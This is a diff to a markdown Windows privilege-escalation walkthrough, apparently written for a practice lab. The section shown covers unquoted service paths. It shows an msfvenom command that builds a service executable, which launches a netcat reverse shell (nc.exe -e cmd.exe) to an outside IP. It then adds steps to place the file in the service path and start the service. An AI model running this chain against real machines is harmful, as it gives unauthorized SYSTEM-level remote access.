@@ -44,6 +44,14 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
           First transfer nc.exe to C:\Users\user directory
           
           msfvenom -p windows/exec CMD="C:\Users\user\nc.exe 10.9.14.98 443 -e cmd.exe" -f exe-service > common.exe
+          
+          Transfer the common.exe to C:\Program Files\Unquoted Path Service
+          
+          type sc start unquotedsvc
+          
+ ![Service(Unquoted_path_1)](https://user-images.githubusercontent.com/55708909/92558713-c3a5fd00-f28c-11ea-9423-fe436ac65491.png)
+         
+          
 
 3- Service (Registry):
 -------------------------------------------------------------------------------------------
